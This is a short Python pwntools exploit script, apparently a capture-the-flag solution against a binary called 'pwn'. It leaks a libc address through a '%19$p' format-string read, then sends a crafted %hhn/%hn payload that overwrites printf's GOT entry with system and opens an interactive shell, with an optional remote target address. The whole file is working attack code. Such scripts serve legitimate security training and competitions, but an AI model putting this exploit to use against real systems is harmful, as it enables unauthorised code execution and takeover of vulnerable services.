from pwn import *
from ctypes import *
context(arch = 'amd64', os = 'linux')

libc = ELF('./libc.so.6')
elf = ELF('./pwn')
flag = 0
if flag:
    r = remote('10.253.37.132', 2604)
else:
    r = process("./pwn")

def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')

'''gdb.attach(r, 'b *0x40132A')
pause()'''

r.sendlineafter(b': \n', b'%19$p')
r.recvuntil(b'0x')
libc.address = int(r.recv(12), 16) - 0x29d90
lg('libc.address')
system = libc.sym['system']
lg('system')

low = libc.sym['system'] & 0xff
high = (libc.sym['system'] >> 8) & 0xffff
payload = b'%' + str(low).encode() + b'c%12$hhn'
payload += b'%' + str(high - low).encode() + b'c%13$hn'
payload = payload.ljust(0x20, b'a')
payload += p64(elf.got['printf']) + p64(elf.got['printf']+1)


r.sendafter(b': \n', payload)

'''r.sendlineafter(b': \n', b'  sh;')'''

r.interactive()